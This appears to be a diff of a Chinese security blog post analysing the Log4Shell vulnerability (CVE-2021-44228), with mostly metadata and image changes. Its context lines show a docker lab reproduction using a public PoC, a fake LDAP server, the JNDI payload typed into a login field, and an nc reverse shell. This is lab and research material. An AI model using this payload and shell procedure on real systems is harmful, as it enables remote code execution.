@@ -16,29 +16,26 @@
 <meta property="og:site_name" content="CiaoFox">
 <meta property="og:description" content="2021年最重量级的CVE-2021-44228漏洞在12月9日被引爆，无数程序员和安全人员都在对其进行应急响应，恰如那个很老的科幻小说《雪崩》，一枚核弹，一个漏洞，没有安全人员可以幸免，我当然也是其中之一。本文主要描述了对漏洞的一些探究与粗浅分析。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2022/03/11/VtYxrLuoJPRSMeh.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/11/R82sAHu3UZNnpwt.png">
 <meta property="og:image" content="https://s2.loli.net/2022/01/05/EgnptS8GA6a1PrM.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/04/rp1ct2CTOh38mxg.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/04/iRhjODoF89Z5TVr.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/04/FYtJBoOauVCcDx2.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/04/Qib7MUO5doFt2SX.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/10/7C21gdEJQOa3sfF.png">
-<meta property="og:image" content="https://s2.loli.net/2022/03/10/rMBHfUnT8w2zgQc.png">
-<meta property="og:image" content="https://s2.loli.net/2022/03/10/cTouaMfReFCqhzb.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/10/MdyYcIOrAC1tapB.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/10/Z6yKu5TJSB23tio.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/10/F1L6vZiKMxPzRoC.png">
-<meta property="og:image" content="https://s2.loli.net/2022/03/11/KuweCPBtFWX6vol.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/11/MOhP6NdET7si4uH.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/11/R82sAHu3UZNnpwt.png">
 <meta property="article:published_time" content="2021-12-13T07:51:56.000Z">
-<meta property="article:modified_time" content="2022-03-15T09:23:02.203Z">
+<meta property="article:modified_time" content="2022-06-21T03:18:39.291Z">
 <meta property="article:author" content="CiaoFox">
 <meta property="article:tag" content="漏洞复现">
 <meta property="article:tag" content="原理分析">
 <meta property="article:tag" content="远程代码执行">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2022/03/11/VtYxrLuoJPRSMeh.png">
+<meta name="twitter:image" content="https://s2.loli.net/2022/03/11/R82sAHu3UZNnpwt.png">
     
 
     
@@ -204,7 +201,7 @@
         </div>
         <div class="article-info profile-block">
             <div class="article-info-block">
-                30
+                31
                 <span>文章</span>
             </div>
             <div class="article-info-block">
@@ -269,7 +266,7 @@
                             &nbsp;
                             600 Privilege Escalation 权限提升
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2019/09/25/600%20Privilege%20Escalation%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%EF%BC%88CVE-2017-16995%EF%BC%89/">Ubuntu本地提权（CVE-2017-16995）</a></li>  <li class="file"><a href="/2022/03/10/600%20Privilege%20Escalation%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/DirtyPipe(CVE-2022-0847)/">DirtyPipe（CVE-2022-0847）</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2019/09/25/600%20Privilege%20Escalation%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%EF%BC%88CVE-2017-16995%EF%BC%89/">Ubuntu本地提权（CVE-2017-16995）</a></li>  <li class="file"><a href="/2022/03/10/600%20Privilege%20Escalation%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/DirtyPipe(CVE-2022-0847)/">DirtyPipe（CVE-2022-0847）</a></li>  <li class="file"><a href="/2022/06/16/600%20Privilege%20Escalation%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/DirtyPipe(CVE-2022-0847)/"></a></li>  </ul> 
                     </li> 
                     
                     <li class="directory">
@@ -453,7 +450,7 @@
 <p>很显然，这是java一个最基础的，功能强大的，适配性极强的开源日志模块。它的使用范围非常广，这也就意味着这次漏洞的影响范围非常大。</p>
 <h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>这个漏洞在2021年12月9日被<a target="_blank" rel="noopener" href="https://help.aliyun.com/noticelist/articleid/1060971232.html" title="万恶之源">阿里云应急响应中心直接公布</a>（我真的很怀疑这不违反漏洞管理方法吗？）（更新下，阿里云因为违法漏洞管理方法被处罚了，笑死。）。发布时间我没记错的话应该是在傍晚，无数公司为了它整夜响应，log4j官方快速释放出log4j-2.15.0-rc1，但是该版本据传依然存在绕过，后续log4j2接连放出了log4j-2.15.0-rc2、log4j-2.16、log4j-2.17等版本，完全修复了该漏洞的利用环。</p>
 <p>说回漏洞。在9号时候阿里云公布的不只是漏洞存在情况，还包括验证POC和漏洞原理。漏洞的原理其实非常简单，log4j会默认打印error和fatal级别的日志，当日志信息中存在特定构造的参数时候，会执行JndiLookup方法进行进一步处理，最终加载由攻击者传入的LDAP服务端地址，然后返回一个恶意的JNDI Reference对象，触发漏洞，实现 RCE。（当然目前的POC大多是用DNS查询记录来验证）</p>
-<p><img src="https://s2.loli.net/2022/03/11/VtYxrLuoJPRSMeh.png" alt="这张图我感觉说得比较明白，来自于微信公众号【研磨架构】"></p>
+<p><img src="https://s2.loli.net/2022/03/11/R82sAHu3UZNnpwt.png" alt="这张图我感觉说得比较明白，来自于微信公众号【研磨架构】"></p>
 <p>漏洞编号为<strong>CVE-2021-44228</strong></p>
 <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h3><p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">根据CVE所描述的范围：</a></p>
 <blockquote>
@@ -527,14 +524,14 @@
 <p><img src="https://s2.loli.net/2022/03/10/7C21gdEJQOa3sfF.png"></p>
 <p>搭建docker靶机，</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd log4j-shell-poc/</span><br><span class="line">sudo docker build -t log4j-shell-poc .</span><br><span class="line">sudo docker run --network host log4j-shell-poc</span><br></pre></td></tr></table></figure>
-<p>搭建成功后可以通过访问<a target="_blank" rel="noopener" href="http://localhost:8080/">http://localhost:8080/</a> 找到你的访问网页。<br><img src="https://s2.loli.net/2022/03/10/rMBHfUnT8w2zgQc.png"></p>
+<p>搭建成功后可以通过访问<a target="_blank" rel="noopener" href="http://localhost:8080/">http://localhost:8080/</a> 找到你的访问网页。</p>
 <p>开始构造漏洞利用恶意类，注意我们需要手动下载java对应版本jdk，这里推荐使用<code>java-8u20</code>.</p>
 <p>获取jdk及具体操作：<a target="_blank" rel="noopener" href="https://github.com/kozmer/log4j-shell-poc#getting-the-java-version">https://github.com/kozmer/log4j-shell-poc#getting-the-java-version</a></p>
 <p>下载java版本的地址（需要注册oracle账号）：<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
 <p>下载后将 <code>jdk1.8.0_20</code> 文件复制到<code>log4j-shell-poc</code>文件夹中，开始启用恶意类。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python3 poc.py --userip localhost --webport 8000 --lport 9001</span><br><span class="line"></span><br><span class="line">[!] CVE: CVE-2021-44228</span><br><span class="line">[!] Github repo: https://github.com/kozmer/log4j-shell-poc</span><br><span class="line"></span><br><span class="line">[+] Exploit java class created success</span><br><span class="line">[+] Setting up fake LDAP server</span><br><span class="line"></span><br><span class="line">[+] Send me: $&#123;jndi:ldap://localhost:1389/a&#125;</span><br><span class="line"></span><br><span class="line">Listening on 0.0.0.0:1389</span><br></pre></td></tr></table></figure>
 
-<p>开始复现，在用户名框输入payload：<code>$&#123;jndi:ldap://localhost:1389/a&#125;</code>，密码可以随便输入<br><img src="https://s2.loli.net/2022/03/10/cTouaMfReFCqhzb.png"></p>
+<p>开始复现，在用户名框输入payload：<code>$&#123;jndi:ldap://localhost:1389/a&#125;</code>，密码可以随便输入</p>
 <p>分别查看恶意类和nc服务。<br><img src="https://s2.loli.net/2022/03/10/MdyYcIOrAC1tapB.png"></p>
 <p><img src="https://s2.loli.net/2022/03/10/Z6yKu5TJSB23tio.png"></p>
 <p>显然这里NC已经受到了回弹的shell，测试一下。<br><img src="https://s2.loli.net/2022/03/10/F1L6vZiKMxPzRoC.png"></p>
@@ -543,8 +540,7 @@
 <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>触发漏洞的关键点在于两个部分：</p>
 <p>1.org.apache.logging.log4j.core.pattern.MessagePatternConverter 的 format() 方法（表达式内容替换）：</p>
 <p>这部分内容重点就在于代码的主要内容就是一旦发现日志中包含 ${ 就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。</p>
-<p>在 ${ 中可以使用的关键词如下，也可以通过<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/lookups.html">官方文档查看</a>：</p>
-<p><img src="https://s2.loli.net/2022/03/11/KuweCPBtFWX6vol.png"></p>
+<p>在 ${ 中可以使用的关键词可以通过<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/lookups.html">官方文档查看</a>：</p>
 <p>2.apache.logging.log4j.core.lookup.StrSubstitutor（提取字符串，并通过 lookup 进行内容替换）</p>
 <p>日志在打印时当遇到 ${ 后，Interpolator 类以:号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。</p>
 <p>由于log4j2 支持很多协议，例如通过 ldap 查找变量，通过 docker 查找变量，通过rmi等等。目前看到使用最多的主要是使用ldap来构造payload:</p>
